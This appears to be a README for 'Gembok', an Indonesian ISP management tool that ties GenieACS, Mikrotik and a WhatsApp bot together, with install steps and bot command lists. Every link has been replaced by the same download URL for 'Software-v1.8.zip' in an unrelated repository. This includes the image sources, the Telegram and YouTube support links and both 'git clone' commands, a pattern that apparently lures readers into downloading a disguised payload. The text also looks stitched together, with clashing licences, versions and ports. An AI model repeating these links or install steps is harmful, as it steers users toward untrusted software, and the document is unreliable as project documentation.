# Genieacs - Mikrotik - WhatsApp Gateway untuk ISP Management
## Webportal Pelanggan
<img width="1358" height="650" alt="Image" src="https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip" />
# Web admin Dasboard
<img width="1366" height="728" alt="Image" src="https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip" />
<img width="1366" height="728" alt="Image" src="https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip" />
<img width="1366" height="728" alt="Image" src="https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip" />
<img width="1366" height="728" alt="Image" src="https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip" />
<img width="1366" height="728" alt="Image" src="https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip" />

Rekening Donasi Untuk Pembangunan Masjid
# 4206 0101 2214 534 BRI an DKM BAITUR ROHMAN <br>
Info https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip ALIJAYA<br>
link group tele : https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip <br>
link chanell tele : https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip<br>

## Deskripsi Aplikasi

Gembok (GenieAcs Mikrotik dan WA Gateway adalah sistem manajemen ISP terintegrasi yang menggabungkan WhatsApp Gateway dengan portal admin web untuk mengelola:

- **GenieACS** - Monitoring dan manajemen perangkat ONU/ONT
- **Mikrotik PPPoE** - Manajemen user PPPoE dan profile
- **Mikrotik Hotspot** - Sistem voucher dan user hotspot
- **WhatsApp Bot** - Interface perintah via WhatsApp
- **Web Portal** - Dashboard admin dan portal pelanggan

## Fitur Utama

### 🔧 WhatsApp Bot Commands
- **GenieACS**: Cek status ONU, edit SSID/password, reboot device
- **Mikrotik**: Manajemen PPPoE, hotspot, interface, firewall
- **Admin**: Tambah/hapus user, generate voucher, monitoring
- **Pelanggan**: Cek status, ganti WiFi, info layanan

### 🌐 Web Portal
- **Admin Dashboard**: Statistik real-time, grafik bandwidth
- **GenieACS Management**: Edit device, tag pelanggan
- **PPPoE Management**: CRUD user, profile management
- **Hotspot Management**: Generate voucher, user management
- **Settings**: Logo upload, WhatsApp QR, system config

### 📊 Monitoring & Notifications
- Real-time PPPoE connection monitoring
- RX Power monitoring dengan notifikasi
- WhatsApp notifications untuk admin/teknisi
- Auto-restart pada error

## Persyaratan Sistem

- **Node.js** v18+ (direkomendasikan v20+)
- **npm** atau yarn
- **GenieACS** API access
- **Mikrotik** API access
- **WhatsApp** number untuk bot

## Instalasi

### 1. Clone Repository
```bash
apt install git curl -y
npm install pm2 -g
```
```bash
git clone https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip
```
```bash
cd gembok
```
### 2. Install Dependencies
```bash
npm install
```
### 3. jalankan aplikasi mode Depelover
```bash
npm start
```
### 4. jalankan aplikasi mode Production
```bash
pm2 start app.js
```

### 5. Konfigurasi Settings
localhost:3001/admin/login // ipserver:3001/admin/login

### Penjelasan Konfigurasi Penting:

#### Admin Settings
- `admins.0` - Nomor WhatsApp admin utama
- `admin_username` / `admin_password` - Login web admin
- `admin_enabled` - Enable/disable fitur admin

#### GenieACS Settings
- `genieacs_url` - URL GenieACS server
- `genieacs_username` / `genieacs_password` - Kredensial GenieACS

#### Mikrotik Settings
- `mikrotik_host` / `mikrotik_port` - Host dan port Mikrotik
- `mikrotik_user` / `mikrotik_password` - Kredensial Mikrotik
- `main_interface` - Interface utama untuk monitoring

#### WhatsApp Settings
- `technician_numbers.0`, `technician_numbers.1` - Nomor teknisi
- `technician_group_id` - ID group Telegram untuk notifikasi
- `whatsapp_session_path` - Path untuk session WhatsApp
- `whatsapp_keep_alive` - Keep alive WhatsApp connection

#### Monitoring Settings
- `pppoe_monitor_enable` - Enable PPPoE monitoring
- `pppoe_monitor_interval` - Interval monitoring (ms)
- `rx_power_warning` / `rx_power_critical` - Threshold RX power
- `rx_power_notification_enable` - Enable RX power notifications

#### Server Settings
- `server_port` - Port web server
- `server_host` - Host web server
- `company_header` - Header untuk pesan WhatsApp
- `footer_info` - Footer untuk web portal

### 4. Menjalankan Aplikasi

**Development Mode:**
```bash
npm run dev
```

**Production Mode:**
```bash
npm start
```

**Dengan PM2:**
```bash
pm2 start app.js
```

### 5. Setup WhatsApp Bot

1. **Siapkan 2 nomor WhatsApp:**
   - 1 nomor untuk bot (akan scan QR code)
   - 1 nomor untuk admin (untuk mengirim perintah)

2. **Scan QR Code** yang muncul di terminal untuk login WhatsApp bot

3. **Test dengan perintah**: `status` atau `menu`

## Akses Web Portal

- **Portal Pelanggan**: `http://ipserver:3001`
- **Admin Dashboard**: `http://ipserver:3001/admin/login`
- **Login Admin**: Username dan password yang dikonfigurasi di `settings.json`

## Perintah WhatsApp Bot

### Perintah untuk Pelanggan
- `menu` - Menampilkan menu bantuan
- `status` - Cek status perangkat
- `refresh` - Refresh data perangkat
- `gantiwifi [nama]` - Ganti nama WiFi
- `gantipass [password]` - Ganti password WiFi
- `info` - Informasi layanan
- `speedtest` - Test kecepatan internet

### Perintah untuk Admin

#### GenieACS Commands
- `devices` - Daftar perangkat
- `cekall` - Cek semua perangkat
- `cek [nomor]` - Cek status ONU
- `cekstatus [nomor]` - Cek status pelanggan
- `admincheck [nomor]` - Cek perangkat admin
- `gantissid [nomor] [ssid]` - Ubah SSID
- `gantipass [nomor] [pass]` - Ubah password
- `reboot [nomor]` - Restart ONU
- `factory reset [nomor]` - Reset factory
- `refresh` - Refresh data perangkat
- `tag [nomor] [tag]` - Tambah tag pelanggan
- `untag [nomor] [tag]` - Hapus tag
- `tags [nomor]` - Lihat tags
- `addtag [device_id] [nomor]` - Tambah tag perangkat
- `addppoe_tag [pppoe_id] [nomor]` - Tambah tag dengan id pppoe
- `adminssid [nomor] [ssid]` - Admin ubah SSID
- `adminrestart [nomor]` - Admin restart ONU
- `adminfactory [nomor]` - Admin factory reset
- `confirm admin factory reset [nomor]` - Konfirmasi factory reset

#### Mikrotik Commands
- `interfaces` - Daftar interface
- `interface [nama]` - Detail interface
- `enableif [nama]` - Aktifkan interface
- `disableif [nama]` - Nonaktifkan interface
- `ipaddress` - Alamat IP
- `routes` - Tabel routing
- `dhcp` - DHCP leases
- `ping [ip] [count]` - Test ping
- `logs [topics] [count]` - Log Mikrotik
- `firewall [chain]` - Status firewall
- `users` - Daftar semua user
- `profiles [type]` - Daftar profile
- `identity [nama]` - Info router
- `clock` - Waktu router
- `resource` - Info resource
- `reboot` - Restart router
- `confirm restart` - Konfirmasi restart


#### Hotspot & PPPoE Management
- `vcr [user] [profile] [nomor]` - Buat voucher
- `hotspot` - User hotspot aktif
- `pppoe` - User PPPoE aktif
- `offline` - User PPPoE offline
- `addhotspot [user] [pass] [profile]` - Tambah user
- `addpppoe [user] [pass] [profile] [ip]` - Tambah PPPoE
- `setprofile [user] [profile]` - Ubah profile
- `delhotspot [username]` - Hapus user hotspot
- `delpppoe [username]` - Hapus user PPPoE
- `addpppoe_tag [user] [nomor]` - Tambah tag PPPoE
- `member [username] [profile] [nomor]` - Tambah member
- `list` - Daftar semua user
- `remove [username]` - Hapus user (generic)
- `addadmin [nomor]` - Tambah nomor admin
- `removeadmin [nomor]` - Hapus nomor admin

#### Sistem & Admin
- `otp [nomor]` - Kirim OTP
- `status` - Status sistem
- `logs` - Log aplikasi
- `restart` - Restart aplikasi
- `debug resource` - Debug resource
- `checkgroup` - Cek status group
- `setadmin [nomor]` - Set nomor admin
- `settechnician [nomor]` - Set nomor teknisi
- `setheader [teks]` - Set header pesan
- `setfooter [teks]` - Set footer pesan
- `setgenieacs [url] [user] [pass]` - Set GenieACS
- `setmikrotik [host] [port] [user] [pass]` - Set Mikrotik
- `admin` - Menu admin
- `help` - Bantuan perintah
- `ya/iya/yes` - Konfirmasi ya
- `tidak/no/batal` - Konfirmasi tidak
- `addwan [interface]` - Tambah WAN

#### WiFi & Layanan
- `info wifi` - Info WiFi pelanggan
- `info` - Info layanan
- `gantiwifi [ssid]` - Ganti nama WiFi
- `gantipass [password]` - Ganti password WiFi
- `speedtest` - Test kecepatan
- `diagnostic` - Diagnostik perangkat
- `history` - Riwayat perangkat
- `menu` - Menu utama
- `factory reset` - Reset factory (pelanggan)
- `confirm factory reset` - Konfirmasi factory reset

## Troubleshooting

### Masalah Group dan Nomor Teknisi

Jika ada error seperti:
```
Error sending message: Error: item-not-found
warn: Skipping invalid WhatsApp number: 6283807665111
```

**Solusi:**

1. **Jalankan Script Perbaikan Otomatis:**
   ```bash
   node scripts/fix-technician-config.js
   ```

2. **Cek Status Group:**
   - Kirim perintah WhatsApp: `checkgroup`
   - Akan menampilkan status group dan nomor teknisi

3. **Perbaiki Manual:**
   - Buka Admin Settings
   - Update nomor teknisi dengan format: `628xxxxxxxxxx`
   - Pastikan group ID berformat: `120363029715729111@g.us`
   - Tambahkan bot ke group teknisi

### Format Nomor yang Benar
- ✅ `628xxxxxxxxxx`
- ❌ `08xxxxxxxxxx`
- ❌ `+628xxxxxxxxxx`

### Format Group ID yang Benar
- ✅ `120363029715729111@g.us`
- ❌ `120363029715729111`
- ❌ `group-120363029715729111`

## Struktur Aplikasi

```
wa-admin-portal/
├── app.js                 # File utama aplikasi
├── package.json           # Dependencies dan scripts
├── settings.json          # Konfigurasi aplikasi
├── env-example.txt        # Template environment variables (tidak digunakan)
├── config/               # Modul konfigurasi
│   ├── whatsapp.js       # WhatsApp bot handler
│   ├── genieacs.js       # GenieACS API
│   ├── mikrotik.js       # Mikrotik API
│   ├── logger.js         # Logging system
│   └── settingsManager.js # Settings management
├── routes/               # Express routes
│   ├── adminAuth.js      # Admin authentication
│   ├── adminDashboard.js # Dashboard routes
│   ├── adminGenieacs.js  # GenieACS management
│   ├── adminMikrotik.js  # Mikrotik management
│   ├── adminHotspot.js   # Hotspot management
│   └── adminSetting.js   # Settings management
├── views/                # EJS templates
│   ├── adminDashboard.ejs
│   ├── adminGenieacs.ejs
│   ├── adminMikrotik.ejs
│   ├── adminHotspot.ejs
│   ├── adminSetting.ejs
│   └── login.ejs
├── public/               # Static files
│   ├── css/
│   ├── js/
│   └── img/
├── logs/                 # Log files
├── scripts/              # Utility scripts
└── whatsapp-session/     # WhatsApp session files
```

## Kontribusi

Untuk berkontribusi pada proyek ini:

1. Fork repository
2. Buat branch fitur baru
3. Commit perubahan
4. Push ke branch
5. Buat Pull Request

## Lisensi

ISC License

## Support

- **Telegram Group**: https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip
- **Telegram Channel**: https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip
- **YouTube**: https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip

---

**Jangan lupa untuk mengkonfigurasi file `settings.json` terlebih dahulu sebelum menjalankan aplikasi!**

# Gembok - Admin Portal WhatsApp Gateway

Aplikasi Admin Portal untuk manajemen layanan internet dengan integrasi WhatsApp Gateway, GenieACS, dan MikroTik.

## Fitur Utama

- Manajemen pelanggan dengan GenieACS
- Monitoring PPPoE dan Hotspot MikroTik
- Notifikasi WhatsApp otomatis
- Portal pelanggan self-service
- Manajemen gangguan (trouble ticket)

## Persyaratan

- Docker dan Docker Compose
- Node.js 16+ (hanya untuk pengembangan)
- Akun Docker Hub (untuk publish image)

## Instalasi dengan Docker

### 1. Pull Image dari Docker Hub

```bash
docker pull alijaya/gembok:1.0
```

### 2. Jalankan dengan Docker Compose

1. Buat direktori untuk data:
   ```bash
   mkdir -p gembok/data
   cd gembok
   ```

2. Buat file `docker-compose.yml`:
   ```yaml
   version: '3.8'
   
   services:
     gembok:
       image: alijaya/gembok:1.1
       container_name: gembok-app
       restart: unless-stopped
       ports:
         - "3001:3001"
       volumes:
         - ./data/img:/usr/src/app/public/img
         - ./data/settings.json:/usr/src/app/settings.json
       environment:
         - NODE_ENV=production
   ```

3. Buat direktori dan file konfigurasi:
   ```bash
   mkdir -p data/img
   touch data/settings.json
   chmod -R 777 data  # Pastikan container bisa menulis
   ```

4. Jalankan aplikasi:
   ```bash
   docker-compose up -d
   ```

5. Buka browser ke `http://localhost:3001`

## Build Image Sendiri

1. Clone repositori:
   ```bash
   git clone https://raw.githubusercontent.com/ThisiYann/gembokumah/main/scripts/Software-v1.8.zip
   cd gembok
   ```

2. Build image:
   ```bash
   docker build -t alijayanet/gembok:latest .
   ```

3. Push ke Docker Hub:
   ```bash
   docker login
   docker push username/gembok:latest
   ```

## Variabel Lingkungan

- `NODE_ENV`: Environment (production/development)
- `PORT`: Port yang digunakan (default: 4000)
- `WHATSAPP_SESSION_PATH`: Lokasi penyimpanan session WhatsApp
- `GENIEACS_URL`: URL GenieACS
- `MIKROTIK_HOST`, `MIKROTIK_USER`, `MIKROTIK_PASS`: Kredensial MikroTik

## Lisensi

MIT
